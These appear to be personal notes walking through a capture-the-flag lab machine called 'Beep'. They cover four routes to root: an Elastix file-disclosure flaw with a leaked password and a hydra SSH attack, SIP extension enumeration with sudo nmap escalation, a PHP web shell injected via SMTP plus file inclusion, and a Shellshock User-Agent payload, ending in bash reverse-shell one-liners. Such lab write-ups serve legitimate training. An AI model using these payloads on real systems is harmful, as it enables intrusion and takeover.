Readme Beep 
(Thanks to ippsec videos)

Various ports open and following were helpful:
22		SSH
25		SMTP
80		Http server	
443		Https server
10000	MiniServ


http Webserver redirected to https:

==========================================
Method 1:

It showed elastix CMS opensource which is nothing but FreePBX

Elastix has a known vulnerability of listing conf file via Graph.php file
It helped to get the password: jEhdIekWmdjE

Threw this password along with other users revealed from /etc/passwd file in hydra for SSH
Boom! Got a shell with root@jEhdIekWmdjE and it was a root shell!

==================================================-==============================
Method 2:

svwar utility helps to get extensions over the elastix cms

svwar -m INVITE -e200-250 IP
Gave extension 233 available

Also could be achieved by using /plugin revealed by dirbuster

This extension would be helpful since there is an exploit related to such extension with elastix

Following changes to that exploit python file would work:

For priv esc we could use 
# sudo -l (show we could nmap)
# sudo nmap --interactive
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
import urllib2, ssl

request = urllib2.Request(url)
response = urllib2.urlopen(request, context=ssl._create_unverified_context())
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

==================================================================================
Method 3:

SMTP LFI: (get the username and home dir from /etc/passwd directory listing LFI)
" nc IP 25 then:
EHLO blahblah (to get all commands)
VRFY username@localhost
mail from:anything@haha.io
rept to:username@localhost
data
Subject: You are pwned
<? Php echo system($_REQUEST['cmd'];?>

.
"

Then check the userdirectory listing by using LFI
the log files passing cmd command then would get shell with 
bash -i >& /dev/tcp/IP/port 0>&1
===================================================================================
Method 4:
MiniServ with WebServ on port 10000
able to run CGI-scripts
thus could be vulnerable to Shell-Shock

cgi scripts if accessbile (like in MiniServ/ Webmin server without login):
Shell shock:
user agent: 
() { :; }; /bin/echo helllo
() { :; }; bash -i >& /dev/tcp/IP/PORT 0>&1

This gives root shell!
